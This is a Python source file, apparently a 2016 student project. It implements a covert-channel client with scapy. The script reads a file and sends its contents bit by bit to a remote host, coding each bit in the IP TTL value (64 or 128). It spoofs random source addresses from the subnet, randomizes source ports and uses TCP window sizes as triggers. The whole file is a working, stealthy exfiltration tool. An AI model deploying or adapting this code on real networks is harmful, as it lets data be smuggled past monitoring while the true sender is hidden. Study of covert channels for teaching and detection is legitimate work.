'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  SOURCE FILE:    client.py
--
--  PROGRAM:        sends data covertly by manipulating the ttl field.
--
--  FUNCTIONS:      randPort(), randIP(ip).
--
--  DATE: September 24, 2016
--
--  REVISIONS: September 25, 2016
--
--  DESIGNERS: Kyle Gilles
--
--  NOTES:
--  Our client sends packets with a randomized range of IP's based on it's subnet.
--  Also sends with randomized source port. The trigger is window size, and the message
--  is passed in the ttl field as binary.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
#!/usr/bin/env python
from scapy.all import *
import sys
import argparse
import time
import random
import socket

#parse cmd line arguments
parser = argparse.ArgumentParser(description='Covert channel client')
parser.add_argument('-d', '--destIp', dest='destIp', help='destination IP address', required=True)
parser.add_argument('-p', '--destPort', dest='destPort', help='destination Port', required=True)
parser.add_argument('-f', '--file', dest='file', help='path to file', required=True)
args = parser.parse_args()

#open file specified, read data
with open (args.file, "r") as myfile:
    message = myfile.read().replace('\n','')

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  FUNCTION
--  Name:       randPort
--  Parameters:
--      none
--  Return Values:
--      port
--          a random source port
--  Description:
--      returns a random port
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def randPort():
    port = (random.randint(2500,12500))
    return port
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  FUNCTION
--  Name:       randIP
--  Parameters:
--      ip
--          host ip address
--  Return Values:
--     ip
--          a random ip from the same subnet
--  Description:
--      returns a new ip address with a random value for the last octet
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def randIP(ip):
    ip1, ip2, ip3, ip4 = ip.split('.')
    ip = ip1+"."+ip2+"."+ip3+"."+str(random.randint(5,25))
    return ip

def main():
    #store our ip
    ip = socket.gethostbyname(socket.gethostname())
    #break down message into groups of 7 bits
    bytemessage =' '.join(format(ord(x), 'b').zfill(7) for x in message)


    #send a packet with ttl 64 for a 0 bit, and ttl 128 for a 1 bit.
    for bit in bytemessage:
        if (bit == '0'):
            #spoof the source IP and source port. Modify window size to trigger server filter
            packet = IP(src=randIP(ip), dst=args.destIp, ttl=64)/TCP(sport = randPort(), dport=int(args.destPort), window=14000)
            send(packet, verbose=False)
        elif (bit == '1'):
            packet = IP(src=randIP(ip), dst=args.destIp, ttl=128)/TCP(sport = randPort(), dport=int(args.destPort), window=14000)
            send(packet, verbose=False)
            #option to sleep between packets
            #time.sleep(RandNum(0,1))


    #after message has been sent, tell server by sending a packet with window size 10000
    packet = IP(src=randIP(ip), dst=args.destIp)/TCP(sport = randPort(), dport=int(args.destPort), window=10000)
    send(packet, verbose=False)
    print "Transmission Complete"

if __name__ == '__main__':
    main();
